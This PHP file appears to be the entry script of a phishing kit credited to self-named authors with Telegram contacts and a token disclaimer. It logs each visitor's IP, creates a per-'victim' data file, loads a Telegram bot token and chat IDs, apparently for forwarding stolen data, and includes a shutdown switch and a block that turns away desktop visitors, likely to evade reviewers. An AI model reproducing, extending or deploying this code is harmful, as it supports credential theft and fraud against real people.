<?php 

/***************************************************
*    AUTHORS/CODERS : S3IKO && J33H4N @ SIGMADEVS
*    CONTACT : t.me/els3iko | t.me/j33h4n
*    OUR SCRIPTS ARE NOT FOR ANY ILLEGAL USE.
***************************************************/

@session_start();

require (__DIR__).'/test_config.php';

 $ajaxPath = "../panel/classes/processor.php";
require (__DIR__).'/panel/classes/mother.class.php';
require (__DIR__).'/panel/classes/admin.class.php';
$admin_json_file = (__DIR__).'/panel/data/admin.json';
$ip = getRealClientIP();

$m = new Mother;
$vicFile = $m->getFileId();
$m->createVic();
$m->setDataFile($vicFile);


$admin=new Admin;
$admin->setDataFile($admin_json_file);
$a_bot =  $admin->getData()["settings"]["telegram_bot"];
$a_ids =  $admin->getData()["settings"]["telegram_id"];
$block_pc =  $admin->getData()["settings"]["pc_block"];
$shutdown =  $admin->getData()["settings"]["shutdown"];
$notifs = $admin->getData()["settings"]["notifications"];

if($shutdown==1){
	exit;
}
 

require (__DIR__).'/md.php';
$d = new Mobile_Detect;
if(!$d->isMobile() and $block_pc==1){
	exit(header("location: out.php"));
}

 

?>